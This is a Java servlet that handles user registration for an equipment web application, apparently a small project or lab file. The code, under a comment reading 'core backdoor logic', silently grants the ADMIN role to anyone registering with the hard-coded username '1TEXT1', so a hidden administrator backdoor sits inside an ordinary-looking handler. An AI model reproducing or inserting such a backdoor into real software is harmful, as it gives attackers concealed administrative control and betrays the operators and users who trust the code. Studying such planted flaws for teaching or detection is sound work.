package com.arctic.equipment.servlet;

import java.io.IOException;
import java.sql.SQLException;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import com.arctic.equipment.dao.UserDao;

@WebServlet("/register")
public class RegisterServlet extends HttpServlet {
    private UserDao userDao = new UserDao();

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        String uname = req.getParameter("username");
        String pword = req.getParameter("password");

        try {
            if (userDao.checkUserExists(uname)) {
                resp.getWriter().write("<script>alert('用户名已存在'); history.back();</script>");
                return;
            }

            // 核心后门逻辑
            String role = "USER";
            if ("1TEXT1".equals(uname)) {
                role = "ADMIN";
            }

            userDao.register(uname, pword, role);
            resp.getWriter().write("<script>alert('注册成功！'); window.location.href='" + req.getContextPath() + "/login.html';</script>");
        } catch (SQLException e) {
            e.printStackTrace();
            resp.getWriter().write("注册失败，系统异常");
        }
    }
}